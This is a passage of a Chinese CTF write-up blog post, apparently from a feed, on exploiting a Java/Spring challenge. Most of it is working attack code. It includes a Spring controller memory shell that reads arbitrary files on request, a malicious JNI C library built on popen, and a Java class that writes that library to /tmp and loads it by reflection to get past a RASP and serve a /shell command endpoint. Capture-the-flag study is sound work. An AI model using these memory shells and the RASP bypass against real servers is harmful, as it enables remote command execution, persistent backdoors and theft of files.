class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exre</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingHandlerMapping</span> <span class="variable">mappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">configField</span> <span class="operator">=</span> mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">readmethod</span> <span class="operator">=</span> exre.class.getMethod(<span class="string">&quot;readfile2&quot;</span>, HttpServletRequest.class,HttpServletResponse.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> RequestMappingInfo.paths(<span class="string">&quot;/readfile2&quot;</span>).options(config).build();</span><br><span class="line">            <span class="type">exre</span> <span class="variable">readfile_inject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">exre</span>();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readfile2</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;filepath&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(filePath!=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">                <span class="type">byte</span>[] fileBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[fileInputStream.available()];</span><br><span class="line">                fileInputStream.read(fileBytes);</span><br><span class="line">                fileInputStream.close();</span><br><span class="line">                <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(fileBytes);</span><br><span class="line">                response.getWriter().write(base64String);</span><br><span class="line">                response.getWriter().flush();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>什么，你说你不会 base64 转成二进制文件？🤣</p><p>自己写个脚本转换都行，👴告诉你，还能上 cyberchef 转换，还能导出为文件😅</p><h2 id="rasp"><span id="rasp"> RASP😅😡</span></h2><p>绕过 content-length 就简单了？8 可能！</p><p>nmb 甚至有 RASP,√Ⅷ,👴没学过.</p><h3 id="啥事-rasp"><span id="啥事-rasp"> 啥事 RASP</span></h3><p>在 2012 年的时候，Gartner 引入了 <code>Runtime application self-protection</code>  一词，简称为 RASP。它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预。</p><p>RASP 技术可以快速的将安全防御功能整合到正在运行的应用程序中，它拦截从应用程序到系统的所有调用，确保它们是安全的，并直接在应用程序内验证数据请求。Web 和非 Web 应用程序都可以通过 RASP 进行保护。该技术不会影响应用程序的设计，因为 RASP 的检测和保护功能是在应用程序运行的系统上运行的。</p><p>👴说人话：就是 nm 把内存过滤，实时动态防护。别人叫内存马，你叫内存盾.</p><p>至于这玩意，👴就不在这里赘述了，先等👴新开个文章，记录一下 RASP 的学习笔记.</p><p>👴回来了，到了最后的步骤了., 看👴绕过这该死的 RASP.</p><p>通过 java-agent 插桩技术，hook 住了一些底层的类，使得 java 的 exec 不能够执行</p><p>一般是 unix 或这 forkandexec</p><p><code>forkAndExec</code>  通常是与操作系统进程管理相关的操作，用于在类 Unix 操作系统中（如 Linux）创建子进程并在子进程中执行指定的程序。</p><p>可恶的 RASP hook 住了这些类</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106112422.png" alt="微信截图_20231106112422"></p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106112531.png" alt="微信截图_20231106112531"></p><p>甚至还不让本地 JNI 加载了， <code>loadLibrary0</code>  也被 hook 了</p><h2 id="解决方案"><span id="解决方案"> 解决方案😒</span></h2><p>底层的 native 方法  <code>java.lang.ClassLoader.NativeLibrary#load</code>  并未被 hook，并且反射也是可以正常使用的，所以可以尝试使用反射来调用  <code>java.lang.ClassLoader.NativeLibrary</code>  中的  <code>load</code>  方法来加载恶意 so 文件执行命令</p><p>船新姿势之 <code>javah</code></p><p>可以，我就喜欢 h😊</p><p><code>javah</code>  是 Java 开发工具包 (JDK) 提供的一个命令行工具，用于生成 Java 类的本地方法接口 (Native Method Interface, JNI) 头文件。JNI 允许 Java 代码与本地（通常是 C 或 C++）代码进行交互，这在某些情况下非常有用，例如与硬件交互或与现有的本地库进行集成。</p><p>编写包含本地方法声明的 Java 类，使用  <code>native</code>  关键字声明本地方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilClass</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">execCmd</span><span class="params">(String cmd)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用 javac 编译成 class, 然后使用 javah 编译成 h 文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javah -jni EvilClass</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>生成的 EvilClass.h 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span></span><br><span class="line">#include &lt;jni.h&gt;</span><br><span class="line"><span class="comment">/* Header for class EvilClass */</span></span><br><span class="line"></span><br><span class="line">#ifndef _Included_EvilClass</span><br><span class="line">#define _Included_EvilClass</span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">#endif</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Class:     EvilClass</span></span><br><span class="line"><span class="comment"> * Method:    execCmd</span></span><br><span class="line"><span class="comment"> * Signature: (Ljava/lang/String;)Ljava/lang/String;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_EvilClass_execCmd</span></span><br><span class="line">  <span class="params">(JNIEnv *, jclass, jstring)</span>;</span><br><span class="line"></span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125;</span><br><span class="line">#endif</span><br><span class="line">#endif</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来还要根据这个 h 文件写 C 文件，nm👴不会 c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execmd</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *cmd, <span class="type">char</span> *result)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">1024</span>*<span class="number">12</span>];              <span class="comment">//定义缓冲区</span></span><br><span class="line">    FILE *pipe = popen(cmd, <span class="string">&quot;r&quot;</span>); <span class="comment">//打开管道，并执行命令</span></span><br><span class="line">    <span class="keyword">if</span> (!pipe)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">//返回0表示运行失败</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof(pipe))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fgets(buffer, <span class="number">128</span>, pipe))</span><br><span class="line">        &#123; <span class="comment">//将管道输出到result中</span></span><br><span class="line">            <span class="built_in">strcat</span>(result, buffer);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pclose(pipe); <span class="comment">//关闭管道</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;      <span class="comment">//返回1表示运行成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里开启了一个缓冲区， <code>popen</code>  是 C 中执行命令时打开的一个管道，以只读模式打开。如果为空，则命令执行失败，返回.</p><p>同时 while 使用 feof 检测 pipe 状态，未结束就持续从 pipe 里面每次最大获取 128 个字节内容，放到缓冲区，然后将结果追加到 <code>result</code>  中.</p><p>随后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_EvilClass_execCmd</span><span class="params">(JNIEnv *env, jclass class_object, jstring jstr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, <span class="literal">NULL</span>); <span class="comment">// 获取 Java 字符串 jstr 的 UTF-8 编码</span></span><br><span class="line">    <span class="type">char</span> result[<span class="number">1024</span> * <span class="number">12</span>] = <span class="string">&quot;&quot;</span>; <span class="comment">// 定义一个存放命令执行结果的字符数组</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> == execmd(cstr, result)) <span class="comment">// 调用之前定义的 execmd 函数来执行系统命令</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果命令执行成功，你可以在这里进行一些处理，但代码中被注释掉了</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> return_messge[<span class="number">100</span>] = <span class="string">&quot;&quot;</span>; <span class="comment">// 定义一个存放返回消息的字符数组</span></span><br><span class="line">    <span class="built_in">strcat</span>(return_messge, result); <span class="comment">// 将命令执行结果追加到返回消息</span></span><br><span class="line"></span><br><span class="line">    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge); <span class="comment">// 创建一个 Java 字符串，用于存储返回消息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cmdresult; <span class="comment">// 返回 Java 字符串，包含命令执行结果</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="jni-规范"><span id="jni-规范"> JNI 规范</span></h3><p><strong>JNI 原型函数：</strong> JNI 规范定义了一组标准的 JNI 函数原型，如 <code>GetStringUTFChars</code> 、 <code>ReleaseStringUTFChars</code>  等，以方便操作字符串、数组、引用等常见任务。</p><p><strong>JNI 函数命名规范：</strong> JNI 函数的命名必须遵循特定的命名规范，通常是 Java 类名（用下划线替代点号）后跟 Java 方法名。例如，Java 类 <code>com.example.MyClass</code>  中的方法 <code>myNativeFunction</code>  对应的 JNI 函数应为 <code>Java_com_example_MyClass_myNativeFunction</code> 。</p><p><strong>JNIEnv 指针：</strong> JNI 函数的第一个参数是一个 <code>JNIEnv</code>  指针，它是一个关于 JNI 环境的上下文。通过 <code>JNIEnv</code> ，JNI 函数可以访问 Java 虚拟机的各种功能，如对象创建、方法调用和异常处理。</p><p><strong>数据类型转换：</strong> JNI 定义了各种数据类型的对应关系，以便 Java 和本地代码之间的数据传递。例如，Java 的 <code>int</code>  对应 JNI 的 <code>jint</code> ，Java 的 <code>String</code>  对应 JNI 的 <code>jstring</code>  等。JNI 函数允许在这些数据类型之间进行转换。</p><p>从参数上看：它接受三个参数： <code>JNIEnv *env</code> （JNI 环境指针）、 <code>jclass class_object</code> （表示 Java 类的类对象）、 <code>jstring jstr</code> （一个 Java 字符串）。</p><p>通过  <code>(*env)-&gt;GetStringUTFChars</code>  函数将 Java 字符串  <code>jstr</code>  转换为 C 字符串  <code>cstr</code> ，这是因为  <code>execmd</code>  函数需要接受 C 字符串作为参数。</p><p>中间执行命令，存储.</p><p>使用  <code>(*env)-&gt;NewStringUTF</code>  函数创建一个新的 Java 字符串  <code>cmdresult</code> ，用于存储返回消息。</p><p>将两部分放在一起，形成 c 文件，然后编译</p><p>编译:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -FPIC -I /home/siroha/java8202/include -I /home/siroha/java8202/include/linux -shared -o libcmd.so ./EvilClass.c</span><br><span class="line">base64 -w <span class="number">0</span> libcmd.so &gt; Evil.txt</span><br></pre></td></tr></table></figure><p>写文件的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">            randomAccessFile.write(jniBytes);</span><br><span class="line">            randomAccessFile.close();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终写个 load 的内存🐎</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import org.springframework.web.context.WebApplicationContext;</span><br><span class="line">import org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.RandomAccessFile;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.Vector;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">EvilClass</span> <span class="title">extends</span> <span class="title">AbstractTranslet</span> &#123;</span></span><br><span class="line">    public <span class="type">static</span> native String <span class="title function_">execCmd</span><span class="params">(String cmd)</span>;</span><br><span class="line">    private <span class="type">static</span> final String EVIL_JNI_BASE64 = <span class="string">&quot;&quot;</span>;<span class="comment">//👴就不放在这里了,太长了,自己生成</span></span><br><span class="line">    private <span class="type">static</span> final String LIB_PATH = <span class="string">&quot;/tmp/libcmd.so&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> &#123;</span><br><span class="line"></span><br><span class="line">        try&#123;</span><br><span class="line">            byte[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64);</span><br><span class="line">            RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">            randomAccessFile.write(jniBytes);</span><br><span class="line">            randomAccessFile.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//调用java.lang.ClassLoader$NativeLibrary类的load方法加载动态链接库</span></span><br><span class="line">            ClassLoader cmdLoader = EvilClass.class.getClassLoader();</span><br><span class="line">            Class&lt;?&gt; classLoaderClazz = Class.forName(<span class="string">&quot;java.lang.ClassLoader&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; nativeLibraryClazz = Class.forName(<span class="string">&quot;java.lang.ClassLoader$NativeLibrary&quot;</span>);</span><br><span class="line">            Method load = nativeLibraryClazz.getDeclaredMethod(<span class="string">&quot;load&quot;</span>, String.class, boolean.class);</span><br><span class="line"></span><br><span class="line">            load.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Field field = classLoaderClazz.getDeclaredField(<span class="string">&quot;nativeLibraries&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            Vector&lt;Object&gt; libs = (Vector&lt;Object&gt;) field.get(cmdLoader);</span><br><span class="line">            Constructor&lt;?&gt; nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class);</span><br><span class="line">            nativeLibraryCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, <span class="literal">false</span>);</span><br><span class="line">            libs.addElement(nativeLibraryObj);</span><br><span class="line">            field.<span class="built_in">set</span>(cmdLoader, libs);</span><br><span class="line">            load.invoke(nativeLibraryObj, LIB_PATH, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//写入内存马</span></span><br><span class="line">            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            Field configField = mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.BuilderConfiguration config =</span><br><span class="line">                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            Method method2 = EvilClass.class.getMethod(<span class="string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">            RequestMappingInfo info = RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>)</span><br><span class="line">                    .options(config)</span><br><span class="line">                    .build();</span><br><span class="line">            EvilClass springControllerMemShell = new EvilClass();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != null) &#123;</span><br><span class="line">            String execRes = EvilClass.execCmd(cmd);</span><br><span class="line">            response.getWriter().write(execRes);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>NativeLibrary</code>  包装到 Vector,Vector 是 <code>Classloader</code>  中 <code>nativeLibraries</code>  的值，</p><p>一般来说用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        Command command = new Command();</span><br><span class="line">        String ipconfig = command.exec(<span class="string">&quot;ipconfig&quot;</span>);</span><br><span class="line">        System.out.println(ipconfig);</span><br></pre></td></tr></table></figure><p>题目 ban 了.</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106155628.png" alt="微信截图_20231106155628"></p><p>芜湖，真√Ⅷ 爽，√Ⅷ 真爽，终出了.</p><p>捏麻麻地，👴花了几天时间，学了一堆东西.</p><p>怎么制作链子，怎么 python 发包，👴在前面已经分析过了。不用问了😅</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
